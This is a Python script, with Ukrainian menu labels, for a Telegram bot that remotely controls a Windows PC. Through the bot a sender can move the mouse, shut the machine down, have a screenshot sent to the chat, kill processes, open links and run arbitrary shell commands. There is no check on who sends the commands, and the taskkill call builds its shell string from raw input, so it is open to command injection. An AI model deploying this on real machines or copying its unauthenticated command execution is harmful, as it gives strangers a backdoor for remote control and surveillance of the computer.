import os
import random
import telebot
from pyautogui import screenshot as sct
from mouse import move
import webbrowser

bot = telebot.TeleBot('TOKEN')
@bot.message_handler(content_types=['text', 'photo'])
def lmdbot(message):
    if message.text == 'Рухати мишкою':
        bot.register_next_step_handler(bot.send_message(message.from_user.id, 'Скільки разів?'), mousemove)
    elif message.text == "Виключити комп'ютер":
        os.system('shutdown -s -t 1')
    elif message.text == 'Скинути скріншот':
        screenshot(message)
    elif message.text == 'Виключити програму':
        bot.register_next_step_handler(bot.send_message(message.from_user.id, 'Програма'), taskkill)
    elif message.text == "Відкрити посилання":
        bot.register_next_step_handler(bot.send_message(message.from_user.id, 'Посилання'), openlink)
    elif message.text == 'Ввести команду в cmd':
        bot.register_next_step_handler(bot.send_message(message.from_user.id, 'Команда'), cmd)
    else:
        markup = telebot.types.ReplyKeyboardMarkup(row_width=2)
        markup.add(telebot.types.KeyboardButton("Рухати мишкою"))
        markup.add(telebot.types.KeyboardButton("Виключити комп'ютер"))
        markup.add(telebot.types.KeyboardButton("Скинути скріншот"))
        markup.add(telebot.types.KeyboardButton("Виключити програму"))
        markup.add(telebot.types.KeyboardButton("Ввести команду в cmd"))
        markup.add(telebot.types.KeyboardButton("Відкрити посилання"))
        bot.send_message(message.from_user.id, "Що робити?", reply_markup=markup)

def mousemove(message):
    try:
        times = int(message.text)
        for a in range(times):
            rh=random.randint(0, 1024)
            rw=random.randint(0, 1280)
            move(rw, rh, duration = 0.5)
    except:
        lmdbot(message)

def taskkill(message):
     task = message.text
     os.system('taskkill /IM ' + task + ' /f')

def cmd(message):
    command = message.text
    os.system(command)

def screenshot(message):
    try:
        sct('screenshot.png')
        with open('screenshot.png', 'rb') as photo:
            bot.send_photo(message.from_user.id, photo)
    except:
        lmdbot(message)

def openlink(message):
    link = message.text
    webbrowser.open(link, new=0, autoraise=True)

bot.polling(none_stop=True)
